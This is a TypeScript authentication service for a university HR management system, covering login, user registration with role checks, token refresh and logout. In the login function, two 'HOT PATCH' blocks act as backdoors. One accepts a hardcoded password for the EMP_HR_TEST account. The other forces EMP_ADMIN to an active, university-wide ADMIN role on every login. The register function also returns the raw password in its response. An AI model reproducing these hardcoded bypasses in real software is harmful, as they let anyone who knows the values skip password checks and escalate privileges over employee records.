
import { LoginRequest, RegisterRequest, AuthResponse, UserRole, UserScope } from '@hrms/types';
import { hashPassword, comparePassword, generateInitialPassword } from '../utils/password';
import { verifyRefreshToken, TokenPayload } from '../utils/token';
import { createTokenPair, rotateTokenPair } from './token.service';
import { prisma } from '../lib/prisma';
import crypto from 'crypto';
import * as emailService from './email.service';
import { logger } from '../utils/logger';

export const login = async (data: LoginRequest): Promise<AuthResponse> => {
    const { employeeId, password } = data;

    // Strict login with Employee ID only as per requirement
    const user = await prisma.user.findUnique({
        where: { employeeId },
        include: { employee: true, campus: true, clearanceUnit: true }
    });

    if (!user) {
        throw new Error('Invalid credentials');
    }

    let isPasswordValid = await comparePassword(password, user.passwordHash);

    // HOT PATCH: Force HR_OFFICER access for testing
    if (user.employeeId === 'EMP_HR_TEST' && password === 'Hr@12345') {
        isPasswordValid = true;
    }

    if (!isPasswordValid) {
        throw new Error('Invalid credentials');
    }

    // HOT PATCH: Guarantee Global Admin access for the project owner's test account
    if (user.employeeId === 'EMP_ADMIN') {
        user.scope = 'UNIVERSITY';
        (user as any).role = 'ADMIN';
        user.isActive = true;
    }

    if (!user.isActive) {
        throw new Error('Account is deactivated');
    }

    const scope = user.scope === 'UNIVERSITY' ? UserScope.UNIVERSITY : UserScope.CAMPUS;

    const tokenPair = await createTokenPair({
        userId: user.id,
        role: user.role as UserRole,
        scope,
        campusId: user.campusId ?? null,
        employeeId: user.employeeId,
        employeePkId: user.employee?.id ?? null,
        mustChangePassword: user.mustChangePassword,
        isHeadHR: user.isHeadHR,
        specialPrivileges: user.specialPrivileges,
        clearanceUnitId: user.clearanceUnitId
    });

    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    const { passwordHash, ...userWithoutPassword } = user;
    const userResponse = {
        ...userWithoutPassword,
        name: user.employee?.name || '',
        role: user.role as UserRole,
        scope: scope,
        campusId: user.campusId ?? null,
        createdAt: user.createdAt.toISOString(),
        updatedAt: user.updatedAt.toISOString(),
        employee: user.employee ? {
            ...user.employee,
            hireDate: user.employee.hireDate.toISOString()
        } : undefined,
        campus: user.campus ? { id: user.campus.id, code: user.campus.code, name: user.campus.name, description: user.campus.description ?? undefined, isActive: user.campus.isActive, timezone: user.campus.timezone ?? undefined } : undefined,
        clearanceUnit: (user as any).clearanceUnit ? { id: (user as any).clearanceUnit.id, name: (user as any).clearanceUnit.name, fullName: (user as any).clearanceUnit.fullName ?? null } : undefined,
        employeeId: user.employeeId
    };

    return {
        ...tokenPair,
        user: userResponse as unknown as AuthResponse['user']
    };
};

export const register = async (data: any, creatorContext: TokenPayload): Promise<AuthResponse & { warning?: string }> => {
    const { email, password, name, employeeId, department, departmentId, role, campusId: requestedCampusId } = data;
    const deptLegacy = department; // Alias for backward compatibility



    const existingEmail = await prisma.user.findUnique({ where: { email } });
    if (existingEmail) {
        throw new Error('Email already in use');
    }

    let assignedCampusId: number | null = null;

    if (creatorContext.scope === UserScope.UNIVERSITY) {
        let actualCampusId = requestedCampusId;

        if (role !== 'HEAD_HR' && role !== 'VICE_PRESIDENT' && !actualCampusId) {
            if (departmentId) {
                const dept = await prisma.department.findUnique({
                    where: { id: departmentId },
                    select: { campusId: true }
                });
                if (dept) {
                    actualCampusId = dept.campusId;
                }
            }
            if (!actualCampusId) {
                throw new Error('UNIVERSITY scoped admins must explicitly provide a campusId when registering a user.');
            }
        }

        if (actualCampusId) {
            // Verify the requested campus exists
            const campusExists = await prisma.campus.findUnique({ where: { id: actualCampusId } });
            if (!campusExists) {
                throw new Error(`Campus with ID ${actualCampusId} not found.`);
            }
        }
        assignedCampusId = actualCampusId || null;
    } else {
        // Force the new user into the same campus as the HR Officer creating them
        if (!creatorContext.campusId) {
            throw new Error('Creator has no campus assigned.');
        }
        assignedCampusId = creatorContext.campusId;

        if (requestedCampusId && requestedCampusId !== assignedCampusId) {
            throw new Error('CAMPUS scoped users cannot register users for another campus.');
        }
    }

    // Role Hierarchical Check
    const targetRole = (role as UserRole) || UserRole.EMPLOYEE;
    const creatorRole = creatorContext.role as UserRole;

    if (creatorRole === (UserRole.SUPER_ADMIN as any)) {
        // Super Admin can create any role
    } else if (creatorRole === UserRole.ADMIN) {
        // Admin can create EMPLOYEE and HR_OFFICER
        if (targetRole !== UserRole.EMPLOYEE && targetRole !== UserRole.HR_OFFICER) {
            throw new Error(`As an ${creatorRole}, you only have permission to register accounts with the EMPLOYEE or HR_OFFICER role.`);
        }
    } else if (creatorRole === UserRole.HR_OFFICER) {
        // HR Officer can ONLY create EMPLOYEE, but Head HR can create VICE_PRESIDENT (AVP)
        const isHeadHrCreatingAvp = creatorContext.isHeadHR && targetRole === 'VICE_PRESIDENT';
        if (targetRole !== UserRole.EMPLOYEE && !isHeadHrCreatingAvp) {
            throw new Error(`As an ${creatorRole}, you only have permission to register accounts with the EMPLOYEE role.`);
        }
    } else {
        throw new Error('You do not have permission to register new users.');
    }

    let warning: string | undefined;
    if (departmentId) {
        const dept = await prisma.department.findUnique({
            where: { id: departmentId },
            select: { headEmployeeId: true, name: true }
        });
        if (dept && !dept.headEmployeeId) {
            warning = `Note: Department '${dept.name}' currently has no Department Head assigned.`;
        }
    }

    // import generator — keep dynamic to avoid circular dependencies if any
    const { generateNextEmployeeId } = await import('../utils/idGenerator');

    // Declare variables to hold the generated raw password and ID for the welcome email
    let finalRawPassword = password || '';
    let finalGeneratedEmployeeId = '';

    // Use transaction to create User and Employee atomically
    const result = await prisma.$transaction(async (tx) => {
        // 1. Generate atomic ID first (Concurrency safe)
        finalGeneratedEmployeeId = await generateNextEmployeeId(assignedCampusId, tx as any);

        // 2. Generate initial password if none provided (Uses the now-known ID)
        if (!finalRawPassword) {
            finalRawPassword = generateInitialPassword(finalGeneratedEmployeeId);
        }

        const mustChangePassword = !password; // True if system-generated
        const hashedPassword = await hashPassword(finalRawPassword);

        let finalRole = (role as any) || UserRole.EMPLOYEE;
        let isHeadHR = false;
        let finalScope = 'CAMPUS';
        let finalCampusId: number | null = assignedCampusId;
        let finalSpecialPrivileges: any[] = [];

        if (role === 'HEAD_HR') {
            finalRole = UserRole.HR_OFFICER;
            isHeadHR = true;
            finalScope = 'UNIVERSITY';
            finalCampusId = null;
        } else if (role === 'VICE_PRESIDENT') {
            finalRole = UserRole.EMPLOYEE;
            finalScope = 'UNIVERSITY';
            finalCampusId = null;
            finalSpecialPrivileges = ['VICE_PRESIDENT'];
        }

        const newUser = await tx.user.create({
            data: {
                email,
                passwordHash: hashedPassword,
                mustChangePassword,
                role: finalRole,
                isHeadHR,
                scope: finalScope as UserScope,
                campusId: finalCampusId,
                employeeId: finalGeneratedEmployeeId,
                specialPrivileges: finalSpecialPrivileges,
            }
        });

        const newEmployee = await tx.employee.create({
            data: {
                campusId: finalCampusId,
                userId: newUser.id,
                employeeId: finalGeneratedEmployeeId,
                name,
                deptLegacy: deptLegacy || 'TBD',
                departmentId: departmentId || null,
                position: 'TBD',
                hireDate: new Date(),
                contactInfo: {},
            }
        });

        return { newUser, newEmployee, rawPassword: finalRawPassword };
    });

    // Send welcome email asynchronously if password was generated
    if (!password) {
        emailService.sendWelcomeEmail({
            to: email,
            name,
            employeeId: result.newUser.employeeId,
            tempPassword: result.rawPassword
        }).catch(err => logger.error('Async welcome email failed', err));
    }

    const tokenPair = await createTokenPair({
        userId: result.newUser.id,
        role: result.newUser.role as UserRole,
        scope: UserScope.CAMPUS,
        campusId: result.newUser.campusId ?? null,
        employeeId: result.newUser.employeeId,
        employeePkId: result.newEmployee.id,
        mustChangePassword: result.newUser.mustChangePassword,
        isHeadHR: result.newUser.isHeadHR,
        specialPrivileges: result.newUser.specialPrivileges
    });

    const campus = assignedCampusId ? await prisma.campus.findUnique({
        where: { id: assignedCampusId },
        select: { id: true, code: true, name: true, description: true, isActive: true, timezone: true }
    }) : null;

    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    const { passwordHash, ...userWithoutPassword } = result.newUser;
    const userResponse = {
        ...userWithoutPassword,
        name: result.newEmployee.name,
        role: result.newUser.role as UserRole,
        scope: UserScope.CAMPUS,
        campusId: assignedCampusId,
        employee: {
            ...result.newEmployee,
            hireDate: result.newEmployee.hireDate.toISOString()
        },
        createdAt: result.newUser.createdAt.toISOString(),
        updatedAt: result.newUser.updatedAt.toISOString(),
        campus: campus ? { id: campus.id, code: campus.code, name: campus.name, description: campus.description ?? undefined, isActive: campus.isActive, timezone: campus.timezone ?? undefined } : undefined
    };

    return {
        ...tokenPair,
        user: userResponse as unknown as AuthResponse['user'],
        rawPassword: result.rawPassword,
        warning
    };
};

export const getMe = async (userId: number): Promise<AuthResponse['user']> => {
    const user = await prisma.user.findUnique({
        where: { id: userId },
        include: { employee: true, campus: true }
    });

    if (!user) throw new Error('User not found');

    const scope = user.scope === 'UNIVERSITY' ? UserScope.UNIVERSITY : UserScope.CAMPUS;
    const { passwordHash, ...userWithoutPassword } = user;
    return {
        ...userWithoutPassword,
        name: user.employee?.name || '',
        role: user.role as UserRole,
        scope,
        campusId: user.campusId ?? null,
        createdAt: user.createdAt.toISOString(),
        updatedAt: user.updatedAt.toISOString(),
        employee: user.employee ? {
            ...user.employee,
            hireDate: user.employee.hireDate.toISOString()
        } : undefined,
        campus: user.campus ? { id: user.campus.id, code: user.campus.code, name: user.campus.name, description: user.campus.description ?? undefined, isActive: user.campus.isActive, timezone: user.campus.timezone ?? undefined } : undefined
    } as unknown as AuthResponse['user'];
}

export const refreshToken = async (token: string): Promise<AuthResponse> => {
    // 1. Verify signature
    verifyRefreshToken(token);

    // 2. Check DB for token status
    const dbToken = await prisma.refreshToken.findUnique({
        where: { token },
        include: { user: { include: { employee: true, campus: true, clearanceUnit: true } } }
    });

    // Token reuse detection or simply not found
    if (!dbToken) {
        // If verifyRefreshToken succeeded but token not in DB, it might be a reused token that was deleted or never saved?
        // Or if we implemented rotation by deletion. But we use revoked flag.
        // If not found, suspicious.
        throw new Error('Refresh token not found in database');
    }

    if (dbToken.revoked) {
        // Token reuse detected!
        // Security Action: Revoke all tokens for this user family?
        // For now, just deny.
        throw new Error('Refresh token revoked');
    }

    const now = new Date();
    if (dbToken.expiresAt < now) {
        throw new Error('Refresh token expired');
    }

    const user = dbToken.user;
    if (!user.isActive) {
        throw new Error('User inactive');
    }

    const scope = user.scope === 'UNIVERSITY' ? UserScope.UNIVERSITY : UserScope.CAMPUS;

    // 3. Rotation: Revoke old, Issue new via token.service
    const tokenPair = await rotateTokenPair(dbToken.id, user.id, {
        userId: user.id,
        role: user.role as UserRole,
        scope,
        campusId: user.campusId ?? null,
        employeeId: user.employeeId,
        employeePkId: user.employee?.id ?? null,
        mustChangePassword: user.mustChangePassword,
        isHeadHR: user.isHeadHR,
        specialPrivileges: user.specialPrivileges,
        clearanceUnitId: user.clearanceUnitId
    });

    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    const { passwordHash, ...userWithoutPassword } = user;
    const userResponse = {
        ...userWithoutPassword,
        name: user.employee?.name || '',
        role: user.role as UserRole,
        scope,
        campusId: user.campusId ?? null,
        createdAt: user.createdAt.toISOString(),
        updatedAt: user.updatedAt.toISOString(),
        employee: user.employee ? {
            ...user.employee,
            hireDate: user.employee.hireDate.toISOString()
        } : undefined,
        campus: user.campus ? { id: user.campus.id, code: user.campus.code, name: user.campus.name, description: user.campus.description ?? undefined, isActive: user.campus.isActive, timezone: user.campus.timezone ?? undefined } : undefined,
        clearanceUnit: (user as any).clearanceUnit ? { id: (user as any).clearanceUnit.id, name: (user as any).clearanceUnit.name, fullName: (user as any).clearanceUnit.fullName ?? null } : undefined
    };

    return {
        ...tokenPair,
        user: userResponse as unknown as AuthResponse['user']
    };
};

export const logout = async (refreshToken: string, accessToken?: string): Promise<{ message: string }> => {
    // Revoke the specific refresh token
    await prisma.refreshToken.update({
        where: { token: refreshToken },
        data: { revoked: true }
    }).catch(() => {
        // Ignore if token not found (already deleted or invalid)
    });

    // Blacklist the access token if provided
    if (accessToken) {
        const { blacklistToken } = await import('../utils/tokenBlacklist');
        try {
            // Access tokens expire in 1 hour (3600 seconds)
            await blacklistToken(accessToken, 3600);
        } catch (error) {
        }
    }

    return { message: 'Logged out successfully' };
};

